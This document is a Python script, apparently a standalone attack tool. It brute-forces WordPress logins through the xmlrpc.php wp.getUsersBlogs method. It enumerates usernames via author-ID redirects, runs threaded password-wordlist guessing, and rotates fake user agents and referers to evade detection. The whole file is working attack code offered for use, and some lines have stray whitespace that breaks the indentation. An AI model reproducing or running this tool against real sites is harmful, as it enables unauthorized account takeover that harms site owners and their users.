import requests
import threading
import random
from queue import Queue
import xml.etree.ElementTree as ET

print("\033[1;36m")
print(r"""
__  ____  __ _          ____  ____   ____
\ \/ /  \/  | |        |  _ \|  _ \ / ___|
 \  /| |\/| | |   _____| |_) | |_) | |
 /  \| |  | | |__|_____|  _ <|  __/| |___
/_/\_\_|  |_|_____|    |_| \_\_|    \____|

XML-RPC Brute Forcer - By Sheikh Nightshader
""")
print("\033[0m")

target_url = input("WordPress URL: ").rstrip("/")
if not target_url.endswith("/xmlrpc.php"):
    xmlrpc_url = f"{target_url}/xmlrpc.php"
else:
    xmlrpc_url = target_url

wordlist = input("Path to password wordlist: ")
threads_count = int(input("Number of threads: "))                                       
password_queue = Queue()
                                                                                        fake_user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",                                                              "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
]

fake_referers = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com",
    "https://duckduckgo.com",
    "https://baidu.com",
    "https://yandex.com",
]

def find_usernames(url):
    usernames = set()
    for i in range(1, 11):
        try:
            author_url = f"{url}/?author={i}"
            response = requests.get(author_url, timeout=5, allow_redirects=True)
            if response.status_code == 200 and response.url != author_url:                              username = response.url.rstrip("/").split("/")[-1]
                usernames.add(username)
        except Exception:
            continue
    return list(usernames)


def load_passwords():
    with open(wordlist, "r") as f:
        for line in f:
            password_queue.put(line.strip())


def parse_response(response_text):
    try:
        root = ET.fromstring(response_text)
        blog = root.find(".//struct/member[name='blogid']/value")
        return blog is not None
    except ET.ParseError:
        return False


def brute_force(username):
    while not password_queue.empty():
        password = password_queue.get()
        payload = f"""
        <?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value><string>{username}</string></value></param>
                <param><value><string>{password}</string></value></param>
            </params>
        </methodCall>
        """
        headers = {
            'Content-Type': 'application/xml',
            'User-Agent': random.choice(fake_user_agents),
            'Referer': random.choice(fake_referers),
        }
        try:
            response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=5)
            if response.status_code == 200 and parse_response(response.text):
                print(f"\033[1;32m[+] Success: {username}:{password}\033[0m")
                password_queue.queue.clear()
                break
            else:
                print(f"\033[1;31m[-] Failed: {username}:{password}\033[0m")
        except Exception as e:
            print(f"\033[1;31m[!] Error: {e}\033[0m")
        password_queue.task_done()


usernames = find_usernames(target_url)
if usernames:
    print("\033[1;34mDiscovered usernames:\033[0m")
    for idx, username in enumerate(usernames, start=1):
        print(f"{idx}. {username}")
    choice = int(input("Select a username: "))
    selected_username = usernames[choice - 1]
else:
    selected_username = input("Enter the username manually: ")

load_passwords()
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=brute_force, args=(selected_username,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
